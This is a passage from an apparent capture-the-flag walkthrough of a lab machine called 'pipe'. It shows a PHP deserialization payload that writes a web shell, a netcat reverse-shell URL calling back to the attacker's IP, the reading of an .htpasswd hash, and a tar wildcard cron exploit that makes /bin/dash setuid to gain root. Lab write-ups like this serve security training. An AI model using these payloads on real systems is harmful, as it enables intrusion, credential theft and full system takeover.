</span><span class='line'><span class="k">var</span> <span class="nx">object</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">({</span><span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">firstname</span><span class="o">:</span> <span class="s1">&#39;Rene&#39;</span><span class="p">,</span> <span class="nx">surname</span><span class="o">:</span> <span class="s1">&#39;Margitte&#39;</span><span class="p">,</span> <span class="nx">artwork</span><span class="o">:</span> <span class="s1">&#39;The Treachery of Images&#39;</span><span class="p">});</span>
</span><span class='line'><span class="nx">object</span> <span class="o">=</span> <span class="nx">object</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nx">object</span><span class="o">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;{&quot;</span><span class="p">),</span><span class="nx">object</span><span class="o">.</span><span class="nx">length</span><span class="p">);</span>
</span><span class='line'><span class="nx">object</span> <span class="o">=</span> <span class="s2">&quot;O:4:</span><span class="se">\&quot;</span><span class="s2">Info</span><span class="se">\&quot;</span><span class="s2">:4:&quot;</span> <span class="o">+</span> <span class="nx">object</span><span class="p">;</span>
</span><span class='line'><span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">param</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">object</span><span class="p">;</span>
</span><span class='line'><span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;info_form&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">submit</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">The</span> <span class="nx">Treachery</span> <span class="nx">of</span> <span class="nx">Images</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;&lt;</span><span class="nx">i</span><span class="o">&gt;</span><span class="nx">The</span> <span class="nx">Treachery</span> <span class="nx">of</span> <span class="nx">Images</span><span class="o">&lt;/</span><span class="nx">i</span><span class="o">&gt;&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">hr</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="nx">From</span> <span class="nx">Wikipedia</span><span class="p">,</span> <span class="nx">the</span> <span class="nx">free</span> <span class="nx">encyclopedia</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="nx">The</span> <span class="nx">Treachery</span> <span class="nx">of</span> <span class="nx">Images</span> <span class="p">(</span><span class="nx">French</span><span class="o">:</span> <span class="nx">La</span> <span class="nx">trahison</span> <span class="nx">des</span> <span class="nx">images</span><span class="p">,</span> <span class="mi">1928</span><span class="nx">–29</span><span class="p">,</span> <span class="nx">sometimes</span> <span class="nx">translated</span> <span class="k">as</span> <span class="nx">The</span> <span class="nx">Treason</span> <span class="nx">of</span> <span class="nx">Images</span><span class="p">)</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">painting</span> <span class="nx">by</span> <span class="nx">the</span> <span class="nx">Belgian</span> <span class="nx">surrealist</span> <span class="nx">painter</span> <span class="nx">René</span> <span class="nx">Magritte</span><span class="p">,</span> <span class="nx">painted</span> <span class="nx">when</span> <span class="nx">Magritte</span> <span class="nx">was</span> <span class="mi">30</span> <span class="nx">years</span> <span class="nx">old</span><span class="o">.</span> <span class="nx">The</span> <span class="nx">picture</span> <span class="nx">shows</span> <span class="nx">a</span> <span class="nx">pipe</span><span class="o">.</span> <span class="nx">Below</span> <span class="nx">it</span><span class="p">,</span> <span class="nx">Magritte</span> <span class="nx">painted</span><span class="p">,</span> <span class="s2">&quot;Ceci n&#39;est pas une pipe.&quot;</span> <span class="p">[</span><span class="nx">sə</span><span class="o">.</span><span class="nx">si</span> <span class="nx">ne</span> <span class="nx">paz‿yn</span> <span class="nx">pip</span><span class="p">],</span> <span class="nx">French</span> <span class="k">for</span> <span class="s2">&quot;This is not a pipe.&quot;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'><span class="s2">&quot;The famous pipe. How people reproached me for it! And yet, could you stuff my pipe? No, it&#39;s just a representation, is it not? So if I had written on my picture &#39;This is a pipe&#39;, I&#39;d have been lying!&quot;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'><span class="nx">His</span> <span class="nx">statement</span> <span class="nx">is</span> <span class="nx">taken</span> <span class="nx">to</span> <span class="nx">mean</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">painting</span> <span class="nx">itself</span> <span class="nx">is</span> <span class="k">not</span> <span class="nx">a</span> <span class="nx">pipe</span><span class="o">.</span> <span class="nx">The</span> <span class="nx">painting</span> <span class="nx">is</span> <span class="nx">merely</span> <span class="nx">an</span> <span class="nx">image</span> <span class="nx">of</span> <span class="nx">a</span> <span class="nx">pipe</span><span class="o">.</span> <span class="nx">Hence</span><span class="p">,</span> <span class="nx">the</span> <span class="nx">description</span><span class="p">,</span> <span class="s2">&quot;this is not a pipe.&quot;</span> <span class="nx">The</span> <span class="nx">theme</span> <span class="nx">of</span> <span class="nx">pipes</span> <span class="nx">with</span> <span class="nx">the</span> <span class="nx">text</span> <span class="s2">&quot;Ceci n&#39;est pas une pipe&quot;</span> <span class="nx">is</span> <span class="nx">extended</span> <span class="nx">in</span> <span class="nx">his</span> <span class="mi">1966</span> <span class="nx">painting</span><span class="p">,</span> <span class="nx">Les</span> <span class="nx">Deux</span> <span class="nx">Mystères</span><span class="o">.</span> <span class="nx">It</span> <span class="nx">is</span> <span class="nx">currently</span> <span class="nx">on</span> <span class="nx">display</span> <span class="nx">at</span> <span class="nx">the</span> <span class="nx">Los</span> <span class="nx">Angeles</span> <span class="nx">County</span> <span class="nx">Museum</span> <span class="nx">of</span> <span class="nx">Art</span><span class="o">.</span>
</span><span class='line'><span class="nx">The</span> <span class="nx">painting</span> <span class="nx">is</span> <span class="nx">sometimes</span> <span class="nx">given</span> <span class="k">as</span> <span class="nx">an</span> <span class="nx">example</span> <span class="nx">of</span> <span class="nx">meta</span> <span class="nx">message</span> <span class="nx">conveyed</span> <span class="nx">by</span> <span class="nx">paralanguage</span><span class="o">.</span> <span class="nx">Compare</span> <span class="nx">with</span> <span class="nx">Korzybski</span><span class="err">&#39;</span><span class="nx">s</span> <span class="s2">&quot;The word is not the thing&quot;</span> <span class="k">and</span> <span class="s2">&quot;The map is not the territory&quot;</span><span class="o">.</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">div</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;width:500px;overflow:hidden;&quot;</span> <span class="o">&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;images/pipe.jpg&quot;</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;400px&quot;</span> <span class="nx">height</span><span class="o">=</span><span class="s2">&quot;auto&quot;</span> <span class="nx">border</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;info_form&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;param&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;#&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;submit_form(); return false;&quot;</span><span class="o">&gt;</span><span class="nx">Show</span> <span class="nx">Artist</span> <span class="nx">Info</span><span class="o">.&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;&lt;/</span><span class="nx">html</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>It loads <code>scriptz/php.js</code> and there is a link pointing to function <code>submit_form</code> with a hidden value <code>param</code>, then I use burp proxy to check what data will be sent when I click the link <code>Show Artist Info</code>, after URL decoded, I found the following data:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:4:&ldquo;Info&rdquo;:4:{s:2:&ldquo;id&rdquo;;i:1;s:9:&ldquo;firstname&rdquo;;s:4:&ldquo;Rene&rdquo;;s:7:&ldquo;surname&rdquo;;s:8:&ldquo;Margitte&rdquo;;s:7:&ldquo;artwork&rdquo;;s:23:&ldquo;The Treachery of Images&rdquo;;}</span></code></pre></td></tr></table></div></figure></p>

<p>After a close look at the source code in <code>php.js</code>, <code>Log.php.BAK</code> and <code>index.php</code>, I can manage to construct the following payload to upload a web shell:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:3:&ldquo;Log&rdquo;:2:{s:8:&ldquo;filename&rdquo;;s:31:&ldquo;/var/www/html/scriptz/shell.php&rdquo;;s:4:&ldquo;data&rdquo;;s:30:&ldquo;&lt;\?php system($_GET[&lsquo;cmd&rsquo;]); \?>&rdquo;;}</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/pipe/2.png"></p>

<p>Here we can see that <code>shell.php</code> has been created under folder <code>scriptz</code> and now we can run system commands.</p>

<p>The following URL will give us a reverse shell connect back to attacker&rsquo;s port 4444</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://10.1.1.143/scriptz/shell.php?cmd=nc+-e+/bin/sh+10.1.1.130+4444">http://10.1.1.143/scriptz/shell.php?cmd=nc+-e+/bin/sh+10.1.1.130+4444&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/the_pipe# nc -lvnp 4444
</span><span class='line'>listening on [any] 4444 &hellip;
</span><span class='line'>connect to [10.1.1.130] from (UNKNOWN) [10.1.1.143] 33575
</span><span class='line'>id
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>pwd
</span><span class='line'>/var/www/html/scriptz
</span><span class='line'>ls -al
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4096 Nov 22 07:20 .
</span><span class='line'>drwxr-xr-x 4 www-data www-data 4096 Jul  9 13:49 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data   94 Jul  9 13:51 .htaccess
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data  474 Jul  6 02:26 log.php.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data 3768 Jul  5 19:02 php.js
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data   35 Nov 22 07:20 shell.php</span></code></pre></td></tr></table></div></figure></p>

<p>Then using python to jail break the shell and start enumerating</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;);&rdquo;
</span><span class='line'>www-data@pipe:/var/www/html/scriptz$cd ..
</span><span class='line'>www-data@pipe:/var/www/html$ ls -al&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>total 36
</span><span class='line'>drwxr-xr-x 4 www-data www-data 4096 Jul  9 13:49 .
</span><span class='line'>drwxr-xr-x 3 root     root     4096 Jul  5 14:46 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data  137 Jul  6 02:43 .htaccess
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data   43 Jul  6 09:33 .htpasswd
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4096 Jul  6 02:53 images
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data 2801 Jul  9 13:49 index.php
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data  150 Jul  6 01:50 info.php
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data  474 Jul  6 03:43 log.php
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4096 Nov 22 07:20 scriptz
</span><span class='line'>www-data@pipe:/var/www/html$ cat  .htpasswd&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>rene:$apr1$wfYjXf4U$0ZZ.qhGGrtkOxvKr5WFqX/</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene$ ls  -al&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>total 24
</span><span class='line'>drwxr-xr-x 3 rene rene 4096 Jul  6 07:42 .
</span><span class='line'>drwxr-xr-x 3 root root 4096 Jul  5 14:09 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene  220 Jul  5 14:09 .bash_logout
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 3515 Jul  5 14:09 .bashrc
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene  675 Jul  5 14:09 .profile
</span><span class='line'>drwxrwxrwx 2 rene rene 4096 Nov 22 07:38 backup
</span><span class='line'>www-data@pipe:/home/rene$ ls  -al  backup&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>total 140
</span><span class='line'>drwxrwxrwx 2 rene rene  4096 Nov 22 07:38 .
</span><span class='line'>drwxr-xr-x 3 rene rene  4096 Jul  6 07:42 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 65404 Nov 22 07:35 backup.tar.gz
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 22959 Nov 22 07:38 sys-11286.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 23376 Nov 22 07:37 sys-20270.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 19123 Nov 22 07:36 sys-7508.BAK
</span><span class='line'>www-data@pipe:/home/rene$ ls  -al  backup&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>total 156
</span><span class='line'>drwxrwxrwx 2 rene rene  4096 Nov 22 07:39 .
</span><span class='line'>drwxr-xr-x 3 rene rene  4096 Jul  6 07:42 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 65404 Nov 22 07:35 backup.tar.gz
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 22959 Nov 22 07:38 sys-11286.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 13451 Nov 22 07:39 sys-17501.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 23376 Nov 22 07:37 sys-20270.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 19123 Nov 22 07:36 sys-7508.BAK</span></code></pre></td></tr></table></div></figure></p>

<p>Here we noticed that system doing backup automatically, so I go to check cron entry in <code>/etc/crontab</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene$ cat  /etc/crontab&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>/etc/crontab: system-wide crontab&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>Unlike any other crontab you don&rsquo;t have to run the `crontab'&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>command to install the new version when you edit this file&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>and files in /etc/cron.d. These files also have username fields,&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>that none of the other crontabs do.&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>SHELL=/bin/sh
</span><span class='line'>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>m h dom mon dow user  command&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>17 *    * * *   root    cd / &amp;&amp; run-parts &ndash;report /etc/cron.hourly
</span><span class='line'>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts &ndash;report /etc/cron.daily )
</span><span class='line'>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts &ndash;report /etc/cron.weekly )
</span><span class='line'>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts &ndash;report /etc/cron.monthly )
</span><span class='line'>#
</span><span class='line'>* * * * * root /root/create_backup.sh
</span><span class='line'>*/5 * * * * root /usr/bin/compress.sh</span></code></pre></td></tr></table></div></figure></p>

<p>Trying to check the script code in both <code>.sh</code> file, but only <code>/usr/bin/compress.sh</code> can be read:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$ cat /usr/bin/compress.sh
</span><span class='line'>cat /usr/bin/compress.sh&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>!/bin/sh&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>rm -f /home/rene/backup/backup.tar.gz
</span><span class='line'>cd /home/rene/backup
</span><span class='line'>tar cfz /home/rene/backup/backup.tar.gz *
</span><span class='line'>chown rene:rene /home/rene/backup/backup.tar.gz
</span><span class='line'>rm -f /home/rene/backup/*.BAK</span></code></pre></td></tr></table></div></figure></p>

<p>Here I noticed that <code>tar</code> is used with wildcard <code>*</code>, which can be exploited to execute arbitrary commands.</p>

<p><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt" title="Wildcards exploit">Here</a> is the details about Unix wildcard exploit, the relevant information about <code>tar</code> can be found in point 4.3.</p>

<p>I will use setuid a shell command to get a ROOT shell, first of all, I have to check what kind of shell installed in the server.:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$ ls -al /bin/&lt;em>sh
</span><span class='line'>ls -al /bin/&lt;/em>sh
</span><span class='line'>-rwxr-xr-x 1 root root 1029624 Nov 13  2014 /bin/bash
</span><span class='line'>-rwxr-xr-x 1 root root  125400 Nov  8  2014 /bin/dash
</span><span class='line'>lrwxrwxrwx 1 root root       4 Nov 13  2014 /bin/rbash -> bash
</span><span class='line'>lrwxrwxrwx 1 root root       4 Nov  8  2014 /bin/sh -> dash</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, I found <code>/bin/dash</code> appeared in the list, now I am going to create evil script and ROOT it:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$cd /home/rene/backup
</span><span class='line'>www-data@pipe:/home/rene/backup$echo > &ndash;checkpoint=1;
</span><span class='line'>www-data@pipe:/home/rene/backup$echo > &ndash;checkpoint-action=exec=sh\ shell.sh;
</span><span class='line'>www-data@pipe:/home/rene/backup$echo &lsquo;chmod u+s /bin/dash&rsquo; > shell.sh
</span><span class='line'>www-data@pipe:/home/rene/backup$echo &lsquo;touch /home/rene/backup/done&rsquo; >> shell.sh
</span><span class='line'>www-data@pipe:/home/rene/backup$cat shell.sh
</span><span class='line'>chmod u+s /bin/dash
</span><span class='line'>touch /home/rene/backup/done
</span><span class='line'>www-data@pipe:/home/rene/backup$chmod +x shell.sh</span></code></pre></td></tr></table></div></figure></p>

<p>Now just waiting for couple of minutes and you will find that a new file named <code>done</code> has been created.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -al&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>ls -al
</span><span class='line'>total 44
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data     1 Nov 22 08:07 &ndash;checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data     1 Nov 22 08:07 &ndash;checkpoint=1
</span><span class='line'>drwxrwxrwx 2 rene     rene      4096 Nov 24 05:40 .
</span><span class='line'>drwxr-xr-x 3 rene     rene      4096 Jul  6 07:42 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene     rene     20927 Nov 24 05:40 backup.tar.gz
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root     root         0 Nov 24 05:40 done
</span><span class='line'>-rwxr-xr-x 1 www-data www-data    49 Nov 23 07:03 shell.sh</span></code></pre></td></tr></table></div></figure></p>

<p>Now it is ready to run <code>/bin/dash</code> and enjoy the ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$ /bin/dash
</span><span class='line'>/bin/dash&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>whoami&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>whoami
</span><span class='line'>root&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -al /root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>ls -al /root
</span><span class='line'>total 28
</span><span class='line'>drwx&mdash;&mdash;  2 root root 4096 Jul  9 13:53 .
</span><span class='line'>drwxr-xr-x 22 root root 4096 Jul  5 14:01 ..
</span><span class='line'>lrwxrwxrwx  1 root root    9 Jul  5 14:12 .bash_history -> /dev/null
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  570 Jan 31  2010 .bashrc
</span><span class='line'>lrwxrwxrwx  1 root root    9 Jul  9 13:53 .nano_history -> /dev/null
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  140 Nov 20  2007 .profile
</span><span class='line'>-rwx&mdash;&mdash;  1 root root  120 Jul  6 08:59 create_backup.sh
</span><span class='line'>-rw&mdash;&mdash;-  1 root root 4251 Jul  6 10:41 flag.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat /root/flag.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>cat /root/flag.txt
</span><span class='line'>                                                                   .aMMMMMMMMn.  ,aMMMMn.
</span><span class='line'>                                                                 .aMccccccccc&lt;em>YMMn.    &lt;code>Mb
</span><span class='line'>                                                                aMccccccccccccccc*Mn    MP
